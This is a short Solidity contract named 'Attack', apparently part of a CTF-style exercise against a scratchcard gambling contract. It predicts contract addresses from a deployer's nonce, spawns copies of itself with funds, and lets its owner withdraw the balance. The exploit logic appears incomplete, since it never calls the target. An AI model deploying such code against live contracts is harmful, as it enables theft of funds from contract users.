pragma solidity 0.4.24;

import "./ScratchcardAttack.sol";

contract Attack{
    address owner;

    constructor() public payable {
        owner = msg.sender;
    }

    function addressFrom(address _origin, uint _nonce) external pure returns (address) {
        return address(keccak256(byte(0xd6), byte(0x94), _origin, byte(_nonce)));
    }

    function attackScratchcard() public payable{
        Attack con = (new Attack).value(msg.value)();
    }

    function withdraw() public {
        if (msg.sender == owner) {
            msg.sender.transfer(address(this).balance); 
        }
    }

    function () public payable {}
}
